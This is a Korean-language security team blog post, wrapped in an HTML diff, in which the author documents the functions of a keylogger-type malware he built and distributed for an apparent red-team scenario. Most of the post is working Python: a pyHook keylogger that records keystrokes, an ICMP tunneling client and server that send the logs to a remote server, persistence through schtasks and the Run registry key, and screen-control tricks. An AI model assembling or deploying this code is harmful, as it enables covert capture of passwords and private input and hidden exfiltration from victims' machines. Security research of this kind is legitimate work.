@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
+  
+
+  <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Keylogger and Other Functions | Core-Research-Team</title>
+<meta name="generator" content="Jekyll v4.0.1" />
+<meta property="og:title" content="Keylogger and Other Functions" />
+<meta name="author" content="Gurumi" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="라온화이트햇 핵심연구팀 조운삼" />
+<meta property="og:description" content="라온화이트햇 핵심연구팀 조운삼" />
+<link rel="canonical" href="http://localhost:4000/2020-07-01/Keylogger-and-Other-Functions" />
+<meta property="og:url" content="http://localhost:4000/2020-07-01/Keylogger-and-Other-Functions" />
+<meta property="og:site_name" content="Core-Research-Team" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-07-01T00:00:00+00:00" />
+<script type="application/ld+json">
+{"headline":"Keylogger and Other Functions","dateModified":"2020-07-01T00:00:00+00:00","datePublished":"2020-07-01T00:00:00+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020-07-01/Keylogger-and-Other-Functions"},"author":{"@type":"Person","name":"Gurumi"},"url":"http://localhost:4000/2020-07-01/Keylogger-and-Other-Functions","description":"라온화이트햇 핵심연구팀 조운삼","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">
+
+  <!-- RSS -->
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Core-Research-Team" />
+
+  <!-- Google Analytics-->
+  
+ 
+</head>
+
+
+  <body>
+
+    <nav class="nav">
+  <div class="nav-container">
+    <a href="/">
+      <h2 class="nav-title">RAON - Core Research Team</h2>
+    </a>
+    <ul>
+      <li><a href="/about">About</a></li>
+      <li><a href="/">Posts</a></li>
+    </ul>
+  </div>
+</nav>
+
+
+    <main>
+      <div class="post"> 
+	<h1 class="post-title">Keylogger and Other Functions</h1>
+	<div class="post-line"></div>
+
+	
+		
+			
+				<span class="tag"><center><i>Programming</i></center></span>
+			
+		
+			
+				<span class="tag"><center><i>ETC</i></center></span>
+			
+		
+	
+
+	<p>라온화이트햇 핵심연구팀 조운삼</p>
+
+<h2 id="i-intro">I. Intro</h2>
+
+<hr />
+
+<p>지난 프로젝트 투입 때, 수행한 시나리오에서 사용된 Keylogger 형태의 악성코드를 제작&amp;배포 했을 때 사용한 기능들에 대해 정리해봤습니다.  추후 유사한 내용의 프로젝트 혹은 개발시 참고하면 감사하겠습니다. (개발에 사용한 언어는 Python입니다.)</p>
+
+<h2 id="ii-functions">II. Functions</h2>
+
+<hr />
+
+<h3 id="ii-01-keylogger">II-01 .Keylogger</h3>
+
+<p>주요 기능중 하나인 Keylogger 기능은 pyHook을 이용하여 구현하였습니다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pyHook</span>
+
+<span class="n">hm</span><span class="o">=</span><span class="n">pyHook</span><span class="p">.</span><span class="n">HookManager</span><span class="p">()</span>
+<span class="n">hm</span><span class="p">.</span><span class="n">KeyDown</span><span class="o">=</span><span class="n">OnKeyboardEvent</span>
+<span class="n">hm</span><span class="p">.</span><span class="n">KeyUp</span><span class="o">=</span><span class="n">OnKeyboardEvent</span>
+</code></pre></div></div>
+
+<p>보통은 <code class="highlighter-rouge">KeyDown</code>을 이용하여 입력 키를 파악하는 것이 일반적이지만 Shift 키를 이용한 특수문자 입력 혹은 Ctrl, Alt 키를 이용한 기타 키보드 이벤트를 구분하기 위해 <code class="highlighter-rouge">KeyDown</code>, <code class="highlighter-rouge">KeyUp</code>을 이용하여 키보드 이벤트를 구분하였습니다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">keyboardEventDebug</span><span class="p">(</span><span class="n">event</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'========================================</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'MessageName: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">MessageName</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Message: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">Message</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Time: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">Time</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Window: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">Window</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'WindowName: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">WindowName</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Ascii: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">Ascii</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Key: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">Key</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'KeyID: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'ScanCode: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">ScanCode</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Extended: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">Extended</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Injected: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">Injected</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Alt: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">Alt</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Transition: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">Transition</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'========================================</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>pyHook에서 이벤트 발생시 이벤트 객체에 포함되어 있는 구성 요소들입니다. <code class="highlighter-rouge">event.Message</code>를 통해 KeyDown(256), KeyUp(257)을 구분할 수 있습니다.</p>
+
+<p><code class="highlighter-rouge">event.Ascii</code> 혹은 <code class="highlighter-rouge">event.KeyID</code>를 사용해 입력된 키를 구별할 수 있습니다.( <code class="highlighter-rouge">event.KeyID</code>를 사용할 경우 좀 더 다양한 키 이벤트를 구별 할 수 있지만, KeyID에 대해 사전에 파악해야 합니다.)</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">OnKeyboardEvent</span><span class="p">(</span><span class="n">event</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">lst</span>
+
+    <span class="k">if</span> <span class="n">event</span><span class="p">.</span><span class="n">Key</span><span class="o">==</span><span class="s">'Scroll'</span><span class="p">:</span>
+        <span class="n">os</span><span class="p">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="c1"># capture the keystrokes
+</span>    <span class="k">if</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span> <span class="o">!=</span><span class="mi">0</span><span class="p">:</span>
+        <span class="n">keylogs</span><span class="o">=</span><span class="s">''</span>
+        <span class="k">if</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">160</span> <span class="ow">and</span> <span class="n">event</span><span class="p">.</span><span class="n">Message</span><span class="o">==</span><span class="mi">256</span><span class="p">:</span>
+            <span class="n">keylogs</span><span class="o">=</span><span class="s">'[L_Shift Down]'</span>
+        <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">160</span> <span class="ow">and</span> <span class="n">event</span><span class="p">.</span><span class="n">Message</span><span class="o">==</span><span class="mi">257</span><span class="p">:</span>
+            <span class="n">keylogs</span><span class="o">=</span><span class="s">'[L_Shift UP]'</span>
+        <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">161</span> <span class="ow">and</span> <span class="n">event</span><span class="p">.</span><span class="n">Message</span><span class="o">==</span><span class="mi">256</span><span class="p">:</span>
+            <span class="n">keylogs</span><span class="o">=</span><span class="s">'[R_Shift Down]'</span>
+        <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">161</span> <span class="ow">and</span> <span class="n">event</span><span class="p">.</span><span class="n">Message</span><span class="o">==</span><span class="mi">257</span><span class="p">:</span>
+            <span class="n">keylogs</span><span class="o">=</span><span class="s">'[R_Shift UP]'</span>
+        <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">162</span> <span class="ow">and</span> <span class="n">event</span><span class="p">.</span><span class="n">Message</span><span class="o">==</span><span class="mi">256</span><span class="p">:</span>
+            <span class="n">keylogs</span><span class="o">=</span><span class="s">'[L_Control Down]'</span>
+        <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">162</span> <span class="ow">and</span> <span class="n">event</span><span class="p">.</span><span class="n">Message</span><span class="o">==</span><span class="mi">257</span><span class="p">:</span>
+            <span class="n">keylogs</span><span class="o">=</span><span class="s">'[L_Control UP]'</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">event</span><span class="p">.</span><span class="n">Message</span> <span class="o">==</span> <span class="mi">256</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">8</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'[Backspace]'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">9</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'[Tab]'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">13</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'[Enter]'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">20</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'[Caps Lock]'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">21</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'[Hangul]'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">32</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'[Space]'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">127</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'[Delete]'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">186</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">';'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">187</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'+'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">188</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">','</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">189</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'-'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">190</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'.'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">191</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'/'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">192</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'`'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">219</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'['</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">220</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'</span><span class="se">\\</span><span class="s">'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">221</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">']'</span>
+                <span class="k">elif</span> <span class="n">event</span><span class="p">.</span><span class="n">KeyID</span><span class="o">==</span><span class="mi">222</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="s">'</span><span class="se">\'</span><span class="s">'</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">keylogs</span><span class="o">=</span><span class="n">event</span><span class="p">.</span><span class="n">Key</span>
+        <span class="k">if</span> <span class="n">keylogs</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+            <span class="n">lst</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">keylogs</span><span class="p">)</span>
+    
+    <span class="k">return</span> <span class="bp">True</span>
+</code></pre></div></div>
+
+<p>해당 Keylogger는 키 로그를 <code class="highlighter-rouge">lst</code>에 저장해 놓도록 되어 있고, 공백류 문자(Enter, Tab, Space)가 입력될 경우 로그를 전송하도록 구현되어 있으며 알파벳과 숫자를 제외한 문자들에 대해 좀 더 직관적으로 파악하기 위해 <code class="highlighter-rouge">KeyID</code>를 사용해 구분하고 별도의 문자열로 구분했습니다.</p>
+
+<h3 id="ii-02-icmp-tunneling">II-02 ICMP Tunneling</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ICMP Tunneling Client
+</span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">sendICMP</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">'Server IP'</span><span class="p">)</span><span class="o">/</span><span class="n">ICMP</span><span class="p">()</span><span class="o">/</span><span class="n">msg</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'base64'</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">send</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+
+<span class="c1"># ICMP Tunneling Server
+</span><span class="k">def</span> <span class="nf">sniffICMP</span><span class="p">():</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+				<span class="n">rx</span> <span class="o">=</span> <span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s">"icmp"</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">rx</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">Raw</span><span class="p">].</span><span class="n">load</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'base64'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>로그를 전송하는 부분에서 <code class="highlighter-rouge">scapy</code>모듈을 사용하여 ICMP Tunneling Server, Client를 구현하였습니다.</p>
+
+<p>base64로 인코딩하여 전송하는 것은 시나리오 수행상 필요한 부분이므로 제거해도 무관합니다.</p>
+
+<h3 id="ii-03-clipcursor">II-03 ClipCursor</h3>
+
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-clipcursor">ClipCursor function (winuser.h) - Win32 apps</a></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">win32api</span>
+
+<span class="k">def</span> <span class="nf">moveCursor</span><span class="p">():</span>
+	<span class="n">win32api</span><span class="p">.</span><span class="n">ClipCursor</span><span class="p">((</span><span class="n">upper</span><span class="o">-</span><span class="n">left</span> <span class="n">x</span><span class="o">-</span><span class="n">coordinate</span><span class="p">,</span> <span class="n">upper</span><span class="o">-</span><span class="n">left</span> <span class="n">y</span><span class="o">-</span><span class="n">coordinate</span><span class="p">,</span> <span class="n">lower</span><span class="o">-</span><span class="n">right</span> <span class="n">x</span><span class="o">-</span><span class="n">coordinate</span><span class="p">,</span> <span class="n">lower</span><span class="o">-</span><span class="n">right</span> <span class="n">y</span><span class="o">-</span><span class="n">coordinate</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>해당 기능은 Windows에서 클라이언트의 마우스 커서의 행동 영역을 제한하는 기능입니다. <code class="highlighter-rouge">ClipCursor</code>의 인자로 빈 값이나 (0,0,0,0)을 넣을 경우 행동 영역 제한이 해제됩니다.</p>
+
+<h3 id="ii-04-schedule">II-04 Schedule</h3>
+
+<p><a href="https://docs.microsoft.com/ko-kr/windows-server/administration/windows-commands/schtasks">schtasks</a></p>
+
+<p><img src="/assets/sam0700.png" alt="/assets/sam0700.png" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2020/07/03 14:30에 <span class="s2">"Task Command"</span>를 한 번 실행시키는 작업을 <span class="s2">"Task Name"</span>이라는 이름으로 작업 스케줄 등록
+ex<span class="o">)</span> SCHTASKS /create /sc ONCE /SD 2020/07/03 /ST 14:30 /TN <span class="s2">"Task Name"</span> /TR <span class="s2">"Task Command"</span>
+
+/create 작업 스케줄 생성
+/delete 작업 스케줄 삭제
+ex<span class="o">)</span> SCHTASKS /delete /Tn <span class="s2">"My Task"</span>
+/run 등록된 작업 스케줄 <span class="o">(</span>원격/로컬<span class="o">)</span>실행
+ex<span class="o">)</span> SCHTASKS /run /Tn <span class="s2">"My Task"</span>
+/end 작업 스케줄에 의해 실행된 프로그램 <span class="o">(</span>원격/로컬<span class="o">)</span>중지
+
+/sc MINUTE|HOURLY|DAILY|WEEKLY|MONTHLY 매분|시간|일|주|달 마다 실행
+/sc ONCE 지정된 날짜 및 시간에 한 번 실행
+/sc ONSTART 시스템 시작시 실행
+</code></pre></div></div>
+
+<p>Windows에서 제공하는 작업 스케줄러 등록하는 기능입니다. 시나리오 수행에 특정 날짜와 시간대에 동작하도록 하는 기능이 요구되어 구현했습니다.</p>
+
+<p><strong>*시작 프로그램</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">_winreg</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">keyVal</span> <span class="o">=</span> <span class="s">r'Software\Microsoft\Windows\CurrentVersion\Run'</span>
+<span class="n">key2change</span> <span class="o">=</span> <span class="n">OpenKey</span><span class="p">(</span><span class="n">HKEY_CURRENT_USER</span><span class="p">,</span> <span class="n">keyVal</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">KEY_ALL_ACCESS</span><span class="p">)</span>
+<span class="n">SetValueEx</span><span class="p">(</span><span class="n">key2change</span><span class="p">,</span> <span class="s">'MY Execution'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">REG_SZ</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>작업 스케줄러에 작업 등록과 별개로 “시작 프로그램”에 프로그램 실행을 등록시킬 경우 레지스트리에 등록하면 됩니다.</p>
+
+<h3 id="ii-04-etc">II-04 ETC</h3>
+
+<p><strong>Screen Lock</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 사용자의 화면을 잠금화면으로 전환</span>
+rundll32.exe user32.dll, LockWorkStation
+</code></pre></div></div>
+
+<p>O<strong>pen Image</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#전체화면으로 open</span>
+start <span class="s2">""</span> /max <span class="s2">"imagePath"</span>
+</code></pre></div></div>
+
+<p><strong>Change Wallpaper</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 지정된 경로의 이미지로 시스템 배경화면 변경
+</span><span class="kn">import</span> <span class="nn">ctypes</span>
+<span class="n">SPI_SETDESKWALLPAPER</span> <span class="o">=</span> <span class="mi">20</span> 
+<span class="n">ctypes</span><span class="p">.</span><span class="n">windll</span><span class="p">.</span><span class="n">user32</span><span class="p">.</span><span class="n">SystemParametersInfoA</span><span class="p">(</span><span class="n">SPI_SETDESKWALLPAPER</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">image_Path</span> <span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>3개 기능 모두 Windows 화면제어에 관한 기능을 수행합니다.</p>
+
+	</div>
+</div>
+
+
+  <!-- Start disqus 
+<script src="/assets/js/disqusLoader.js" /></script>
+<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
+<div class="disqus"></div>
+<script>
+    disqusLoader('.disqus', {
+        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
+    });
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+End disqus -->
+
+
+<div class="pagination">
+  
+	<a href="/2020-07-01/MacOS-LPE-CVE-2020-9854" class="left arrow">&#8592;</a>
+  
+  
+	<a href="/2020-07-01/Intent-logging" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+
+    </main>
+
+    <!--footer>
+  <span>
+    &copy; <time datetime="2020-08-11 05:29:28 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+  </span>
+</footer-->
+
+  </body>
+</html>
